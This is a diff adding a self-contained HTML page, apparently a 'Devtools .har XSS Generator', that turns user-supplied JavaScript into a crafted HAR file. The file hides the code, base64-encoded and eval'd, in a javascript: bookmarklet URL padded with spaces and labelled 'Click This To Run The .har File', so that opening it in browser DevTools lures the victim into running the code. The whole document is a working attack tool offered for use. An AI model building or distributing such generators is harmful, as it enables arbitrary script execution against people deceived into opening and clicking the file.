@@ -1,0 +1,178 @@
+data:text/html;charset=utf-8,<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Devtools .har XSS Generator</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 40px;
+      background-color: #f4f4f4;
+      color: #222;
+    }
+
+    h1 {
+      color: #2c3e50;
+    }
+
+    a {
+      color: #007acc;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    textarea {
+      width: 100%;
+      max-width: 800px;
+      margin-bottom: 10px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      background-color: white;
+      color: #333;
+      font-family: monospace;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #007acc;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      transition: background-color 0.2s ease;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #005fa3;
+    }
+
+    p {
+      max-width: 800px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Devtools .har XSS Generator</h1>
+  <p><strong>XSS found by Blobby Boi.</strong><br>
+  If anyone else claims they made this site, they didn't!</p>
+
+  <textarea id="jsInput" placeholder="Enter JavaScript code here" rows="10" cols="80"></textarea><br>
+  <button onclick="generateHar()">Generate .har file</button>
+
+  <script>
+    function generateHar() {
+      const inputCode = document.getElementById('jsInput').value.trim();
+      if (!inputCode) {
+        alert('Bro didn’t type any code');
+        return;
+      }
+
+      const now = new Date();
+      const nowISOString = now.toISOString();
+      const base64Code = btoa(inputCode);
+
+      const bookmarkletUrl = `javascript: (function() {eval(atob(\"${base64Code}\"))})()`;
+
+      const har = {
+        log: {
+          version: "1.2",
+          creator: {
+            name: "WebInspector",
+            version: "537.36"
+          },
+          pages: [{
+            startedDateTime: nowISOString,
+            id: "page_1",
+            title: bookmarkletUrl,
+            pageTimings: {
+              onContentLoad: 57.19,
+              onLoad: 57.77
+            }
+          }],
+          entries: [{
+            _connectionId: "16771",
+            _initiator: {
+              type: "script",
+              stack: {
+                callFrames: [{
+                  functionName: "",
+                  scriptId: "9",
+                  url: "",
+                  lineNumber: 11,
+                  columnNumber: 4
+                }]
+              }
+            },
+            _priority: "High",
+            _resourceType: "fetch",
+            cache: {},
+            connection: "443",
+            pageref: "page_1",
+            request: {
+              method: "GET",
+              url: bookmarkletUrl + '//' + ' '.repeat(20) + 'Click This To Run The .har File',
+              httpVersion: "h3",
+              headers: [
+                { name: ":authority", value: "" },
+                { name: ":method", value: "GET" },
+                { name: ":path", value: bookmarkletUrl },
+                { name: ":scheme", value: "javascript" },
+                { name: "accept", value: "*/*" },
+                { name: "user-agent", value: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" }
+              ],
+              queryString: [],
+              cookies: [],
+              headersSize: -1,
+              bodySize: 0
+            },
+            response: {
+              status: 200,
+              statusText: "",
+              httpVersion: "h3",
+              headers: [
+                { name: "content-type", value: "application/javascript; charset=utf-8" }
+              ],
+              cookies: [],
+              content: {
+                size: inputCode.length,
+                mimeType: "application/javascript",
+                text: inputCode
+              },
+              redirectURL: "",
+              headersSize: -1,
+              bodySize: -1
+            },
+            serverIPAddress: "0.0.0.0",
+            startedDateTime: nowISOString,
+            time: 100,
+            timings: {
+              blocked: 0,
+              dns: 0,
+              ssl: 0,
+              connect: 0,
+              send: 0,
+              wait: 50,
+              receive: 50,
+              _blocked_queueing: 0
+            }
+          }]
+        }
+      };
+
+      const blob = new Blob([JSON.stringify(har, null, 2)], { type: "application/json" });
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = 'HARTOOLS.har';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+  </script>
+</body>
+</html>
